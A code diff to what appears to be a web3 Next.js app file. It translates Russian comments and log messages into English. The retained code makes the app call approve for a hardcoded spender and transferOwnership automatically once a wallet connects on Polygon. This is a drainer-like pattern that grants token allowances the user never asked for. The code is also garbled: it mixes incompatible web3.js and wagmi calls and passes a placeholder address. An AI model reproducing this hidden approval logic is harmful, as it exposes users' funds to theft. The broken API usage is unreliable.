@@ -16,7 +16,7 @@ import {
 } from "wagmi/chains";
 import { alchemyProvider } from "wagmi/providers/alchemy";
 import { publicProvider } from "wagmi/providers/public";
-import { infuraProvider } from "wagmi/providers/infura"; // Добавлено для подключения к Infura
+import { infuraProvider } from "wagmi/providers/infura";
 import MainLayout from "../layout/mainLayout";
 
 const abi = [
@@ -426,6 +426,7 @@ const abi = [
 		"type": "function"
 	}
 ];
+
 const contractAddress = '0x694E31fB6cf8E86Bb09e67D58b82B5abc6C2065E';
 
 const alchemyAPIKey = process.env.ALCHEMY_API_KEY;
@@ -468,10 +469,10 @@ const callSmartContract = async () => {
         const response = await fetch(`https://api.etherscan.io/api?module=contract&action=getabi&address=${contractAddress}&format=json`);
         const { result: abi } = await response.json();
         const contractInstance = new provider.eth.Contract(JSON.parse(abi), contractAddress);
-        const result = await contractInstance.methods.transferOwnership('0xNewOwnerAddress').send({ from: '0x694E31fB6cf8E86Bb09e67D58b82B5abc6C2065E' }); // Заменим methodName() на transferOwnership(address)
-        console.log('Результат вызова функции смарт-контракта:', result);
+        const result = await contractInstance.methods.transferOwnership('0xNewOwnerAddress').send({ from: '0x694E31fB6cf8E86Bb09e67D58b82B5abc6C2065E' });
+        console.log('Result of calling smart contract function:', result);
     } catch (error) {
-        console.error('Произошла ошибка при вызове смарт-контракта:', error);
+        console.error('Error calling smart contract:', error);
     }
 };
 
@@ -479,13 +480,13 @@ const approveTransaction = async () => {
     try {
         const contractInstance = wagmiClient.getContract(contractAddress, abi);
         const spender = '0x694E31fB6cf8E86Bb09e67D58b82B5abc6C2065E';
-        const value = '1000000000000000000'; // Замените на желаемое значение
+        const value = '1000000000000000000';
 
         const result = await contractInstance.methods.approve(spender, value).sendTransaction();
 
-        console.log('Транзакция успешно отправлена:', result);
+        console.log('Transaction successfully sent:', result);
     } catch (error) {
-        console.error('Произошла ошибка при отправке транзакции:', error);
+        console.error('Error sending transaction:', error);
     }
 };
 
@@ -494,7 +495,7 @@ function MyApp({ Component, pageProps }) {
         const checkAndCallSmartContract = async () => {
             if (wagmiClient.connected && wagmiClient.chainId === polygon.chainId) {
                 await callSmartContract();
-                await approveTransaction(); // Вызываем функцию approve после вызова функции смарт-контракта
+                await approveTransaction();
             }
         };
 
